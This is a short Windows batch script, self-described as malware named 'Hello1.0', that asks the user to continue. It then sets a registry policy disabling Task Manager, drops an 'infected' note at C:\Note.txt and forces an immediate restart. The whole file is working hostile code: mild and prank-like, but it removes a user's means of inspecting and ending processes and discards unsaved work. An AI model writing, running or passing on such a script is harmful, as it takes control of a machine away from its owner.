@Echo off 
Title Warning!
Echo This Malware Disables Only TaskMgr Do You Want To Run it?
Pause
Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f 
Echo Your PC Has Been infected By Hello1.0 By Taha 2.0.2.4 This Malware is Safety! >"C:\Note.txt"
Shutdown /r /t 0
